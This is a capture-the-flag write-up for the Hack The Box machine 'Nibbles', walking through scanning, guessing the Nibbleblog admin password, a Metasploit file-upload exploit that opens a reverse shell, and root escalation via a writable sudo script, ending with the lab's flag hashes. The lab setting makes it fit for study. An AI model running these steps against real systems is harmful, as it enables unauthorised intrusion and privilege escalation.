## IP

> 10.10.10.75

## nmap scan

```
nmap -T4 -A 10.10.10.75 -Pn
```

```a
Nmap scan report for 10.10.10.75
Host is up (0.060s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## System Info 
>
 OS: Linux

## Open Ports
       
> 22 open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)

SSH

>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

HTTP

## HTTP

> http://10.10.10.75/

![Image](https://github.com/MiguelCaputo/CTFs-writeups/blob/main/Hack%20The%20Box/Nibble/Pasted%20image%2020210801184218.png)

If we see the source we can find 

> !-- /nibbleblog/ directory. Nothing interesting here! 

So lets check it!
 http://10.10.10.75/nibbleblog/

![Image 2](https://github.com/MiguelCaputo/CTFs-writeups/blob/main/Hack%20The%20Box/Nibble/Pasted%20image%2020210801184400.png)

We can perform a gobuster on the site

```
gobuster dir -u http://10.10.10.75/nibbleblog/ -w /usr/share/wordlists/dirb/common.txt
```

> /.hta                 
/.htaccess          
/.htpasswd           
/admin                 [--> http://10.10.10.75/nibbleblog/admin/]
/admin.php                                     
/content              [--> http://10.10.10.75/nibbleblog/content/]
/index.php                                              
/languages          [--> http://10.10.10.75/nibbleblog/languages/]
/plugins               [--> http://10.10.10.75/nibbleblog/plugins/]  
/README                                        
/themes                [--> http://10.10.10.75/nibbleblog/themes/]

We can try to connect into the admin site 

> username: admin

We can try different passwords, I tried nibbles and it worked! 
> password: nibbles 

Lets search in searchsploit

```searchsploit nibble```

> Nibbleblog 3 - Multiple SQL Injections                                           | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                            | php/remote/38489.rb

An arbitrary file upload on metasploit, lets search for it 

### Metasploit 

```
msfconsole
use multi/http/nibbleblog_file_upload
set password nibbles
set username admin
set rhosts 10.10.10.75
set lhost tun0
set targeturi /nibbleblog
run
```

We have a shell!!

### Post Exploitation

```getuid```

> Server username: nibbler (1001)

We are not root

```sysinfo```

>Computer    : Nibbles                                                                                              
OS          : Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64                  
Meterpreter : php/linux

### Finding user.txt

```
shell
cd home/nibbler
cat user.txt
```

> 5d9d3519f7fdf0a13d25bac3224e41af

### Getting root

```history```

> Command not found 

```sudo -l```

> User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
	
So we can root monitor.sh as root! Lets create it

```
cd /home/nibbler
mkdir personal
cd personal
mkdir stuff
cd stuff
echo "bash -i" > monitor.sh
chmod +x monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
```

```whoami```

> root

We are root!

### Finding root.txt

```
cd /root
cat root.txt
```

> aaba32402a5016d5b621fa8b965d680a  
